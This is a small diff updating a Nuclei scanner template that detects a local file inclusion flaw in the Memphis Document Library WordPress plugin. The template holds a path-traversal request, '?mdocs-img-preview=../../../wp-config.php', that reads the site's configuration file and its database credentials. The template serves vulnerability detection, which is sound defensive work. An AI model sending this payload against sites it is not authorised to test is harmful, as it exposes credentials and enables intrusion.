@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: wp-memphis-documents-library-lfi
 info:
   name: WordPress Plugin Memphis Document Library 3.1.5 LFI
@@ -8,7 +9,7 @@ info:
     - https://www.exploit-db.com/exploits/39593
     - https://wpscan.com/vulnerability/53999c06-05ca-44f1-b713-1e4d6b4a3f9f
   tags: wordpress,wp-plugin,lfi
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/mdocs-posts/?mdocs-img-preview=../../../wp-config.php'
